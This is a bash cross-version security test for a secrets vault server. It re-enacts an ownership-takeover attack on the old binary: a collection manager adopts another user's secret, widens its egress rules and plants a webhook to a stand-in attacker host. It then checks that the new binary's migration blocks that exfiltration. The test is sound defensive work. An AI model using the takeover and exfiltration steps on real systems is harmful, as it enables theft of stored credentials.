#!/usr/bin/env bash
# LIVE CROSS-VERSION SKEPTIC.
#
# It asks the questions a unit test cannot: does a REAL binary, against a REAL
# sqlite file, read what a DIFFERENT binary wrote, and does the migration
# between them do what its comment claims when the database it lands on has
# ALREADY BEEN ATTACKED.
#
# ============================================================================
# WHY THE OLD SIDE IS CHOSEN BY A PROPERTY AND NOT BY A COMMIT
# ============================================================================
#
# The previous version defaulted OLD_SRC to a checkout of base 61cb33d3. That
# base ALREADY CONTAINED migration 00034, so the "old" binary applied the
# migration too, both sides ran the same schema, and the run reported 16 passed
# and 0 failed over a boundary it never crossed. A hardcoded ref is a statement
# about the past that quietly stops being true; a property is not.
#
# So the old side is DERIVED: the parent of the commit that added the migration
# under test. Then both sides are checked, and a run where they share it is a
# HARD FAILURE rather than a green sheet:
#
#   the old checkout MUST NOT contain the migration
#   the new tree     MUST contain it
#
# Override OLD_REF to test an upgrade from somewhere specific. Both checks still
# run, so an override that does not actually predate the migration fails loudly
# instead of silently proving nothing.
set -u

MIGRATION_BASENAME="00034_secret_owner.sql"
MIGRATION_REL="internal/database/migrations/$MIGRATION_BASENAME"
# The version the migration under test introduces, and the highest version the
# new tree carries. Both are read off the filenames rather than typed, so adding
# a migration cannot leave this script asserting a number from last month.
MIGRATION_VERSION="$(printf '%s' "$MIGRATION_BASENAME" | sed 's/^0*\([0-9]*\)_.*/\1/')"

NEW_SRC="${NEW_SRC:-$(cd "$(dirname "$0")/.." && pwd)}"
REPO_ROOT="$(cd "$NEW_SRC" && git rev-parse --show-toplevel)"
# The migration path as git sees it, from the repository root.
MIGRATION_GIT="$(cd "$NEW_SRC" && git ls-files --full-name "$MIGRATION_REL")"

WORK="$(mktemp -d)"
DATA="$WORK/data"
mkdir -p "$DATA"
OLD_TREE="$WORK/old-checkout"

VK="live-skeptic-vault-key-000000000000"
JW="live-skeptic-jwt-secret-00000000000000"
PORT=18731
BASE="http://127.0.0.1:$PORT"

ADMIN_PW="correct-horse-battery-staple-1"
VICTIM_PW="victim-correct-horse-battery-2"
MANAGER_PW="manager-correct-horse-battery-3"

pass=0
fail=0
ok() {
  echo "  PASS  $*"
  pass=$((pass + 1))
}
bad() {
  echo "  FAIL  $*"
  fail=$((fail + 1))
}
die() {
  echo "  ABORT $*"
  exit 1
}

cleanup() {
  (cd "$REPO_ROOT" 2>/dev/null && git worktree remove --force "$OLD_TREE" >/dev/null 2>&1)
  rm -rf "$WORK"
}
trap cleanup EXIT

# ── choosing the old side ───────────────────────────────────────────────────

echo "== choosing the OLD side by a property, not by a ref =="
[ -n "$MIGRATION_GIT" ] || die "git does not track $MIGRATION_REL"
(cd "$REPO_ROOT" && git cat-file -e "HEAD:$MIGRATION_GIT") 2>/dev/null ||
  die "HEAD does not contain $MIGRATION_GIT. The NEW side must be the one that HAS the migration"

ADDED_IN="$(cd "$REPO_ROOT" && git rev-list HEAD -- "$MIGRATION_GIT" | tail -1)"
[ -n "$ADDED_IN" ] || die "could not find the commit that added $MIGRATION_GIT"
DERIVED_OLD="$(cd "$REPO_ROOT" && git rev-parse --short "$ADDED_IN^")"
OLD_REF="${OLD_REF:-$DERIVED_OLD}"
echo "  $MIGRATION_BASENAME was added in $(cd "$REPO_ROOT" && git rev-parse --short "$ADDED_IN")"
echo "  old side: $OLD_REF   new side: $(cd "$REPO_ROOT" && git rev-parse --short HEAD)"

# THE CHECK THAT MAKES THIS A CROSS-VERSION TEST. If both sides hold the
# migration, everything below proves nothing at all, so it stops here.
if (cd "$REPO_ROOT" && git cat-file -e "$OLD_REF:$MIGRATION_GIT") 2>/dev/null; then
  bad "THE TWO SIDES SHARE THE MIGRATION. $OLD_REF already contains $MIGRATION_BASENAME, so the old
        binary would apply it too and nothing below crosses the boundary it claims to test. That is
        exactly the defect this script was rewritten to remove: the previous default (61cb33d3) was a
        DESCENDANT of the commit that added the migration."
  echo
  echo "RESULT: $pass passed, $fail failed"
  exit 1
fi
ok "the old side ($OLD_REF) does NOT contain $MIGRATION_BASENAME and the new side does"

(cd "$REPO_ROOT" && git worktree add --detach "$OLD_TREE" "$OLD_REF" >/dev/null 2>&1) ||
  die "could not check out $OLD_REF"
PREFIX="$(cd "$NEW_SRC" && git rev-parse --show-prefix)"
OLD_SRC="$OLD_TREE/${PREFIX%/}"
[ -f "$OLD_SRC/go.mod" ] || die "no go.mod at $OLD_SRC"
[ -f "$OLD_SRC/$MIGRATION_REL" ] &&
  die "the checkout at $OLD_SRC still has $MIGRATION_BASENAME on disk"

echo
echo "== building both binaries =="
(cd "$OLD_SRC" && go build -buildvcs=false -o "$WORK/ti-old" ./cmd/server) || die "old build failed"
(cd "$NEW_SRC" && go build -buildvcs=false -o "$WORK/ti-new" ./cmd/server) || die "new build failed"
echo "  old: $(shasum -a256 "$WORK/ti-old" | cut -c1-16)  new: $(shasum -a256 "$WORK/ti-new" | cut -c1-16)"

# ── plumbing ────────────────────────────────────────────────────────────────

start() { # $1 binary, $2 vault key, $3 logfile
  TRUSTISSUES_PORT=$PORT TRUSTISSUES_BIND_HOST=127.0.0.1 \
    TRUSTISSUES_VAULT_KEY="$2" TRUSTISSUES_JWT_SECRET="$JW" \
    TRUSTISSUES_DATA_DIR="$DATA" TRUSTISSUES_FRONTEND_DIR="$WORK/nofrontend" \
    TRUSTISSUES_BASE_URL="$BASE" TRUSTISSUES_LOG_LEVEL=warn \
    "$1" >"$3" 2>&1 &
  echo $!
}

wait_up() {
  for _ in $(seq 1 60); do
    curl -fsS "$BASE/health" >/dev/null 2>&1 && return 0
    sleep 0.25
  done
  return 1
}

stop() {
  kill "$1" 2>/dev/null
  wait "$1" 2>/dev/null
  for _ in $(seq 1 40); do
    curl -fsS "$BASE/health" >/dev/null 2>&1 || return 0
    sleep 0.25
  done
  return 1
}

# jsonfield FILE KEY prints the first string value of KEY.
jsonfield() { sed -n "s/.*\"$2\":\"\([^\"]*\)\".*/\1/p" "$1" | head -1; }

# api METHOD PATH COOKIEJAR [BODY] -> body on stdout, status code in $STATUS
STATUS=""
api() {
  local method="$1" path="$2" jar="$3" body="${4:-}"
  local out="$WORK/api.out"
  if [ -n "$body" ]; then
    STATUS=$(curl -s -o "$out" -w '%{http_code}' -X "$method" "$BASE$path" \
      -b "$jar" -c "$jar" -H 'Content-Type: application/json' -H "Origin: $BASE" -d "$body")
  else
    STATUS=$(curl -s -o "$out" -w '%{http_code}' -X "$method" "$BASE$path" \
      -b "$jar" -c "$jar" -H "Origin: $BASE")
  fi
  cat "$out"
}

login() { # $1 email, $2 password, $3 jar
  rm -f "$3"
  api POST /api/auth/login "$3" "{\"email\":\"$1\",\"password\":\"$2\"}" >/dev/null
  [ "$STATUS" = "200" ] || die "login failed for $1 ($STATUS)"
}

DBFILE=""
findb() {
  DBFILE=$(find "$DATA" -name "*.db" | head -1)
  [ -n "$DBFILE" ] || die "no sqlite file under $DATA"
}
sq() { sqlite3 "$DBFILE" "$1"; }

command -v sqlite3 >/dev/null 2>&1 || die "sqlite3 is required: this script reads the column under test"

ADMIN_J="$WORK/j-admin"
VICTIM_J="$WORK/j-victim"
MANAGER_J="$WORK/j-manager"

# ── phase 1: the OLD binary builds a database, and the attack is performed ──

echo
echo "== phase 1: the OLD binary ($OLD_REF, no $MIGRATION_BASENAME) creates the data =="
PID=$(start "$WORK/ti-old" "$VK" "$WORK/old.log")
wait_up || {
  echo "old binary did not come up:"
  cat "$WORK/old.log"
  exit 1
}

api POST /api/auth/register "$ADMIN_J" \
  "{\"email\":\"live-admin@example.com\",\"password\":\"$ADMIN_PW\",\"name\":\"Live Admin\"}" >/dev/null
case "$STATUS" in 200 | 201) ok "first-run register on the old binary" ;; *) die "register failed ($STATUS)" ;; esac

for who in victim manager; do
  pw=$VICTIM_PW
  [ "$who" = "manager" ] && pw=$MANAGER_PW
  api POST /api/admin/users "$ADMIN_J" \
    "{\"email\":\"$who@example.com\",\"password\":\"$pw\",\"name\":\"$who\",\"role\":\"user\"}" >/dev/null
  case "$STATUS" in 200 | 201) : ;; *) die "creating $who failed ($STATUS)" ;; esac
done
findb
VICTIM_ID=$(sq "SELECT id FROM users WHERE email='victim@example.com';")
MANAGER_ID=$(sq "SELECT id FROM users WHERE email='manager@example.com';")
[ -n "$VICTIM_ID" ] && [ -n "$MANAGER_ID" ] || die "could not resolve the two user ids"
ok "victim and manager accounts created on the old binary"

api POST /api/collections "$ADMIN_J" '{"name":"Team","description":"shared"}' >"$WORK/coll.json"
COLL_ID=$(jsonfield "$WORK/coll.json" id)
[ -n "$COLL_ID" ] || die "collection create failed ($STATUS): $(head -c 200 "$WORK/coll.json")"

api POST "/api/collections/$COLL_ID/members" "$ADMIN_J" '{"email":"victim@example.com","role":"editor"}' >/dev/null
api POST "/api/collections/$COLL_ID/members" "$ADMIN_J" '{"email":"manager@example.com","role":"manager"}' >/dev/null

login victim@example.com "$VICTIM_PW" "$VICTIM_J"
api POST "/api/collections/$COLL_ID/accept" "$VICTIM_J" '{}' >/dev/null
case "$STATUS" in 200 | 204) : ;; *) die "victim could not accept the invitation ($STATUS)" ;; esac
login manager@example.com "$MANAGER_PW" "$MANAGER_J"
api POST "/api/collections/$COLL_ID/accept" "$MANAGER_J" '{}' >/dev/null
case "$STATUS" in 200 | 204) : ;; *) die "manager could not accept the invitation ($STATUS)" ;; esac
ok "a shared collection with an editor (the victim) and a manager (the attacker)"

# The victim deposits the secret this whole round is about, INSIDE the shared
# collection, and a second one in their own personal vault as the control.
api POST /api/vault "$VICTIM_J" "{
    \"name\":\"team-stripe\",\"value\":\"sk_live_THE_TEAM_SECRET\",
    \"provider\":\"shared-secret\",\"collection_id\":\"$COLL_ID\",
    \"notes\":\"deposited by the victim, in the collection\"}" >"$WORK/e1.json"
SHARED_ENTRY=$(jsonfield "$WORK/e1.json" id)
[ -n "$SHARED_ENTRY" ] || die "shared entry create failed ($STATUS): $(head -c 300 "$WORK/e1.json")"

api POST /api/vault "$VICTIM_J" '{
    "name":"personal-stripe","value":"sk_live_THE_PERSONAL_SECRET",
    "provider":"shared-secret","notes":"the untouched control"}' >"$WORK/e2.json"
PERSONAL_ENTRY=$(jsonfield "$WORK/e2.json" id)
[ -n "$PERSONAL_ENTRY" ] || die "personal entry create failed ($STATUS)"
ok "the victim deposited a shared secret ($SHARED_ENTRY) and a personal one ($PERSONAL_ENTRY)"

echo
echo "-- THE ATTACK, two ordinary product calls, on the old binary --"
api DELETE "/api/collections/$COLL_ID/members/$VICTIM_ID" "$MANAGER_J" >/dev/null
case "$STATUS" in 200 | 204) : ;; *) die "step 1 (remove the creator) failed ($STATUS)" ;; esac
api PUT "/api/vault/$SHARED_ENTRY" "$MANAGER_J" '{"name":"taken-by-the-manager"}' >"$WORK/adopt.json"
[ "$STATUS" = "200" ] || die "step 2 (adopt and rename) failed ($STATUS): $(head -c 200 "$WORK/adopt.json")"

HOLDER=$(sq "SELECT user_id FROM vault_entries WHERE id='$SHARED_ENTRY';")
if [ "$HOLDER" = "$MANAGER_ID" ]; then
  ok "the attack SUCCEEDED on the old binary: vault_entries.user_id is now the manager"
else
  bad "the attack did not reproduce (user_id is $HOLDER, expected the manager $MANAGER_ID).
        Everything below would then be testing a database that was never attacked, which is the same
        class of vacuous green this script exists to stop."
fi

# While they hold user_id, the attacker does what the old binary lets them:
# widen the ceiling and plant a delivery target. That is the state the migration
# lands on.
api PUT "/api/vault/$SHARED_ENTRY" "$MANAGER_J" \
  '{"destination_patterns":["attacker.invalid/*"]}' >"$WORK/widen-old.json"
if [ "$STATUS" = "200" ]; then
  ok "on the OLD binary the attacker could widen the ceiling to a host they chose (that is the defect)"
else
  bad "the attacker could not widen on the old binary ($STATUS): $(head -c 200 "$WORK/widen-old.json")"
fi

TVER=$(curl -s -b "$MANAGER_J" "$BASE/api/vault/$SHARED_ENTRY/targets" |
  sed -n 's/.*"version":"\([^"]*\)".*/\1/p' | head -1)
api PUT "/api/vault/$SHARED_ENTRY/targets?version=$TVER" "$MANAGER_J" \
  '[{"type":"webhook","webhook_url":"https://attacker.invalid/collect","label":"planted"}]' >"$WORK/plant.json"
case "$STATUS" in
200 | 204) ok "the attacker planted a webhook delivery target while they held the entry" ;;
*) bad "planting the delivery target failed ($STATUS): $(head -c 200 "$WORK/plant.json")" ;;
esac

# The victim's own entry gets the same shape, legitimately, so the control is a
# real comparison rather than a weaker configuration.
api PUT "/api/vault/$PERSONAL_ENTRY" "$VICTIM_J" \
  '{"destination_patterns":["control.invalid/*"]}' >"$WORK/widen-ctl-old.json"
[ "$STATUS" = "200" ] || bad "the victim could not set their own ceiling on the old binary ($STATUS)"
PVER=$(curl -s -b "$VICTIM_J" "$BASE/api/vault/$PERSONAL_ENTRY/targets" |
  sed -n 's/.*"version":"\([^"]*\)".*/\1/p' | head -1)
api PUT "/api/vault/$PERSONAL_ENTRY/targets?version=$PVER" "$VICTIM_J" \
  '[{"type":"webhook","webhook_url":"https://control.invalid/hook","label":"the owners own target"}]' >"$WORK/ctl-target.json"
case "$STATUS" in
200 | 204) : ;;
*) bad "the victim could not configure their own target ($STATUS): $(head -c 200 "$WORK/ctl-target.json")" ;;
esac

# An invitation, so the round-19 at-rest questions still get asked.
api POST /api/admin/invitations "$ADMIN_J" \
  '{"email":"invitee@example.com","name":"Invitee","target_role":"vault_only"}' >"$WORK/invite.json"
INVITE_CODE=$(jsonfield "$WORK/invite.json" code)
[ -n "$INVITE_CODE" ] && ok "invitation created by the old binary" || bad "no invite code"

stop "$PID"
findb
echo "  old binary stopped; sqlite file is $DBFILE ($(du -h "$DBFILE" | cut -f1))"

# THE PRE-STATE, asserted rather than assumed.
if sq "PRAGMA table_info(vault_entries);" | grep -q "secret_owner_user_id"; then
  bad "the OLD binary's database already has secret_owner_user_id. The old side is not old."
else
  ok "the database the old binary left has NO secret_owner_user_id column (the migration has not run)"
fi
TARGET_VERSION="$(ls "$NEW_SRC/internal/database/migrations" | sed -n 's/^0*\([0-9][0-9]*\)_.*\.sql$/\1/p' | sort -n | tail -1)"
OLDVER=$(sq "SELECT MAX(version_id) FROM goose_db_version;")
if [ "$OLDVER" -lt "$MIGRATION_VERSION" ] 2>/dev/null; then
  ok "the old binary migrated only as far as goose version $OLDVER (the migration under test is $MIGRATION_VERSION)"
else
  bad "the old binary's database is at goose version $OLDVER, so it already applied the migration"
fi

STORED=$(sq "SELECT code FROM invitations LIMIT 1;")
case "$STORED" in
enc:v1:*) ok "invitations.code is sealed at rest (${STORED:0:14}...)" ;;
*) bad "invitations.code is NOT sealed at rest: $STORED" ;;
esac
NOTES=$(sq "SELECT notes FROM vault_entries LIMIT 1;")
case "$NOTES" in
enc:v1:*) ok "vault_entries.notes is sealed at rest" ;;
*) bad "vault_entries.notes is NOT sealed at rest: $NOTES" ;;
esac

# ── phase 2: the NEW binary applies the migration for the first time ────────

echo
echo "== phase 2: the NEW binary boots on that database and applies $MIGRATION_BASENAME =="
PID=$(start "$WORK/ti-new" "$VK" "$WORK/new.log")
wait_up || {
  echo "NEW binary did not come up on data the old one wrote:"
  cat "$WORK/new.log"
  exit 1
}
ok "the new binary booted on a database the old binary wrote (the boot key gate accepted it)"

if sq "PRAGMA table_info(vault_entries);" | grep -q "secret_owner_user_id"; then
  ok "the migration APPLIED to this database for the first time (the column now exists)"
else
  bad "the column still does not exist, so the migration did not run"
fi
NEWVER=$(sq "SELECT MAX(version_id) FROM goose_db_version;")
if [ "$NEWVER" -ge "$TARGET_VERSION" ] 2>/dev/null; then
  ok "goose moved from version $OLDVER to $NEWVER across the two binaries (the tree carries $TARGET_VERSION)"
else
  bad "goose is at $NEWVER after the new binary booted, expected at least $TARGET_VERSION"
fi

echo
echo "-- what the backfill decided --"
ATTACKED_OWNER=$(sq "SELECT secret_owner_user_id FROM vault_entries WHERE id='$SHARED_ENTRY';")
if [ -z "$ATTACKED_OWNER" ]; then
  ok "THE ATTACKED ENTRY HAS NO OWNER. The migration refused to copy the attacker's user_id into the
        column the exit asks about, which is the whole finding."
elif [ "$ATTACKED_OWNER" = "$MANAGER_ID" ]; then
  bad "THE MIGRATION LAUNDERED THE ATTACK: secret_owner_user_id is the manager ($MANAGER_ID). The
        attacker is now the permanent owner and the exit will authorise them correctly forever."
else
  bad "the attacked entry's owner is $ATTACKED_OWNER, which is neither empty nor the attacker"
fi

# WHICH clause denied it. A pass that cannot say why is a pass that could be an
# accident, and this run has to distinguish the two evidence paths the migration
# actually uses.
ATTACK_COLL=$(sq "SELECT COALESCE(collection_id,'(personal)') FROM vault_entries WHERE id='$SHARED_ENTRY';")
ATTACK_ADOPTROWS=$(sq "SELECT COUNT(*) FROM activity_log WHERE action='vault.entry_adopted' AND instr(detail,'Entry $SHARED_ENTRY ')>0;")
echo "        evidence: collection_id=$ATTACK_COLL, vault.entry_adopted rows naming it=$ATTACK_ADOPTROWS"
if [ "$ATTACK_COLL" = "(personal)" ] && [ "$ATTACK_ADOPTROWS" = "0" ]; then
  bad "neither of the migration's two clauses can have fired on the attacked entry, so the empty
        owner above is an accident of this fixture rather than the rule doing its job."
else
  ok "the denial is attributable: the entry is in a collection and/or the audit trail names its adoption"
fi

CONTROL_OWNER=$(sq "SELECT secret_owner_user_id FROM vault_entries WHERE id='$PERSONAL_ENTRY';")
if [ "$CONTROL_OWNER" = "$VICTIM_ID" ]; then
  ok "POSITIVE CONTROL: the untouched personal entry kept its rightful owner ($VICTIM_ID)"
else
  bad "the untouched entry's owner is '$CONTROL_OWNER', expected the victim $VICTIM_ID. A migration
        that denies everything is safe and useless."
fi

WITHHELD=$(sq "SELECT COUNT(*) FROM activity_log WHERE action='vault.owner_backfill_withheld';")
if [ "$WITHHELD" -ge 1 ] 2>/dev/null; then
  ok "the operator was told, durably: $(sq "SELECT detail FROM activity_log WHERE action='vault.owner_backfill_withheld' LIMIT 1;" | cut -c1-88)..."
else
  bad "no vault.owner_backfill_withheld row: the migration stranded a secret silently"
fi

# ── phase 3: on the wire, the attacker cannot direct the secret ─────────────

echo
echo "== phase 3: ON THE WIRE, can the attacker still direct the secret? =="
login manager@example.com "$MANAGER_PW" "$MANAGER_J"
login victim@example.com "$VICTIM_PW" "$VICTIM_J"

api PUT "/api/vault/$SHARED_ENTRY" "$MANAGER_J" \
  '{"destination_patterns":["attacker.invalid/*","second.attacker.invalid/*"]}' >"$WORK/widen-new.json"
if [ "$STATUS" = "403" ] && grep -q "egress_widening_denied" "$WORK/widen-new.json"; then
  ok "the attacker's widening is REFUSED on the new binary (403 egress_widening_denied)"
else
  bad "the attacker widened the ceiling after the migration ($STATUS): $(head -c 220 "$WORK/widen-new.json")"
fi

api PUT "/api/vault/$PERSONAL_ENTRY" "$VICTIM_J" \
  '{"destination_patterns":["control.invalid/*","second.control.invalid/*"]}' >"$WORK/widen-control.json"
if [ "$STATUS" = "200" ]; then
  ok "POSITIVE CONTROL: the rightful owner can still widen their own entry after the migration"
else
  bad "the rightful owner was refused their own widening ($STATUS): $(head -c 220 "$WORK/widen-control.json")"
fi

echo
echo "-- delivery: the planted target must not be honoured, the owner's must be --"
REFUSAL='egress refused|not a destination recorded|may not choose where'

# Delivery runs in a goroutine the handler only waits for at shutdown, so the
# rotate RESPONSE can return before the outcome is recorded. Poll for it. A
# refusal is instant (no network) and a real attempt has to resolve DNS first,
# so reading once would have compared a written refusal against an unwritten
# transport error and called that a pass.
wait_rotation_outcome() { # $1 entry id
  local i outcome
  for i in $(seq 1 60); do
    outcome=$(sq "SELECT COALESCE(last_rotation_error,'') FROM vault_entries WHERE id='$1';")
    [ -n "$outcome" ] && {
      printf '%s' "$outcome"
      return 0
    }
    sleep 0.5
  done
  return 1
}

api POST "/api/vault/$SHARED_ENTRY/rotate" "$MANAGER_J" "{\"password\":\"$MANAGER_PW\"}" >"$WORK/rot-attacked.json"
ATTACK_ERR=$(wait_rotation_outcome "$SHARED_ENTRY")
if printf '%s' "$ATTACK_ERR" | grep -qEi "$REFUSAL"; then
  ok "the webhook the attacker planted was REFUSED AT THE EXIT: $(printf '%s' "$ATTACK_ERR" | cut -c1-96)"
else
  bad "the attacker's planted webhook was not refused at the exit.
        rotate response:     $(head -c 200 "$WORK/rot-attacked.json")
        last_rotation_error: '$ATTACK_ERR'"
fi

api POST "/api/vault/$PERSONAL_ENTRY/rotate" "$VICTIM_J" "{\"password\":\"$VICTIM_PW\"}" >"$WORK/rot-control.json"
CONTROL_ERR=$(wait_rotation_outcome "$PERSONAL_ENTRY")
if [ -z "$CONTROL_ERR" ]; then
  bad "POSITIVE CONTROL INCONCLUSIVE: the owner's rotation recorded no delivery outcome at all within
        30s, so this run cannot tell an authorised delivery from one that never happened."
elif printf '%s' "$CONTROL_ERR" | grep -qEi "$REFUSAL"; then
  bad "POSITIVE CONTROL FAILED: the rightful owner's own delivery was REFUSED AT THE EXIT.
        last_rotation_error: $CONTROL_ERR
        A migration that denies every entry passes every attack test and breaks the product."
else
  ok "POSITIVE CONTROL: the owner's delivery was AUTHORISED and reached the transport, which then
        failed on an unresolvable host by design rather than on a refusal:
        $(printf '%s' "$CONTROL_ERR" | cut -c1-110)"
fi

# ── phase 4: the operator can see and repair what was withheld ──────────────

echo
echo "== phase 4: the repair surface, because a fail-closed migration needs one =="
api GET /api/admin/vault/ownership "$MANAGER_J" >"$WORK/own-manager.json"
case "$STATUS" in
401 | 403) ok "a non-admin is refused GET /api/admin/vault/ownership ($STATUS)" ;;
*) bad "the manager got $STATUS from the admin ownership report: $(head -c 200 "$WORK/own-manager.json")" ;;
esac

login live-admin@example.com "$ADMIN_PW" "$ADMIN_J"
api GET /api/admin/vault/ownership "$ADMIN_J" >"$WORK/own.json"
if [ "$STATUS" = "200" ] && grep -q "$SHARED_ENTRY" "$WORK/own.json"; then
  ok "the admin report NAMES the stranded entry, with the reason"
else
  bad "the ownership report does not list the stranded entry ($STATUS): $(head -c 300 "$WORK/own.json")"
fi
if grep -q "$PERSONAL_ENTRY" "$WORK/own.json"; then
  bad "the report also lists the entry that kept its owner, so it is listing everything"
else
  ok "the report does NOT list the entry that kept its owner"
fi

api POST "/api/admin/vault/$SHARED_ENTRY/ownership/claim" "$MANAGER_J" '{}' >"$WORK/claim-manager.json"
case "$STATUS" in
401 | 403 | 404) ok "the attacker cannot claim ownership of the entry they took ($STATUS)" ;;
*) bad "the manager claimed ownership through the repair route ($STATUS): $(head -c 200 "$WORK/claim-manager.json")" ;;
esac

api POST "/api/admin/vault/$SHARED_ENTRY/ownership/claim" "$ADMIN_J" '{}' >"$WORK/claim.json"
if [ "$STATUS" = "204" ]; then
  ok "an instance admin claimed the stranded entry (204)"
else
  bad "the admin claim returned $STATUS: $(head -c 250 "$WORK/claim.json")"
fi
ADMIN_ID=$(sq "SELECT id FROM users WHERE email='live-admin@example.com';")
REPAIRED=$(sq "SELECT secret_owner_user_id FROM vault_entries WHERE id='$SHARED_ENTRY';")
if [ "$REPAIRED" = "$ADMIN_ID" ]; then
  ok "the repaired entry now records the admin as its owner, through vaultegress.AuthorizeTransfer"
else
  bad "after the claim the owner is '$REPAIRED', expected the admin $ADMIN_ID"
fi

api GET /api/admin/vault/ownership "$ADMIN_J" >"$WORK/own2.json"
if grep -q "$SHARED_ENTRY" "$WORK/own2.json"; then
  bad "the repaired entry is still listed as unowned"
else
  ok "the repaired entry has left the list"
fi

api POST "/api/admin/vault/$SHARED_ENTRY/ownership/claim" "$ADMIN_J" '{}' >"$WORK/claim2.json"
if [ "$STATUS" = "409" ]; then
  ok "claiming an entry that already records an owner is refused (409), so this is not a second
        general-purpose transfer route"
else
  bad "a second claim on an owned entry returned $STATUS: $(head -c 200 "$WORK/claim2.json")"
fi

# ── phase 5: everything the earlier rounds proved, still true ───────────────

echo
echo "== phase 5: the at-rest and route questions the earlier rounds closed =="
# As the VICTIM: GET /api/vault lists what the caller can reach, and the control
# entry is in their personal vault, not the admin's.
api GET /api/vault "$VICTIM_J" >"$WORK/list.json"
for want in 'personal-stripe' 'the untouched control'; do
  if grep -q "$want" "$WORK/list.json"; then
    ok "the new binary decrypted a column the old one sealed: $want"
  else
    bad "the new binary could NOT read $want (at-rest format regression)"
  fi
done

api GET /api/admin/invitations "$ADMIN_J" >"$WORK/invites.json"
if grep -q "$INVITE_CODE" "$WORK/invites.json"; then
  ok "the new binary decrypted invitations.code through the declared door"
else
  bad "the new binary could NOT read invitations.code: $(head -c 300 "$WORK/invites.json")"
fi

CODE=$(curl -s -o "$WORK/vo.json" -w '%{http_code}' -b "$MANAGER_J" "$BASE/api/admin/invitations")
case "$CODE" in
401 | 403) ok "a non-admin is refused GET /api/admin/invitations ($CODE), so the instance-owned ruling holds live" ;;
*) bad "a non-admin got $CODE from GET /api/admin/invitations: $(head -c 200 "$WORK/vo.json")" ;;
esac

stop "$PID"

echo
echo "== phase 6: the boot key gate still refuses a WRONG key =="
PID=$(start "$WORK/ti-new" "definitely-the-wrong-vault-key-999" "$WORK/wrong.log")
sleep 3
if kill -0 "$PID" 2>/dev/null; then
  bad "the new binary is STILL RUNNING under a wrong vault key; the boot gate is gone"
  stop "$PID"
else
  if grep -qi "does not match" "$WORK/wrong.log"; then
    ok "the new binary refused to start under a wrong vault key, with the operator message intact"
  else
    bad "the new binary exited under a wrong key but without the mismatch message: $(tail -3 "$WORK/wrong.log")"
  fi
fi

echo
echo "== phase 7: the correct key still works after the refusal =="
PID=$(start "$WORK/ti-new" "$VK" "$WORK/again.log")
if wait_up; then
  ok "the correct key still boots (the refusal did not re-seal the sentinel)"
else
  bad "the correct key no longer boots"
fi
stop "$PID"

echo
echo "RESULT: $pass passed, $fail failed"
[ "$fail" -eq 0 ]
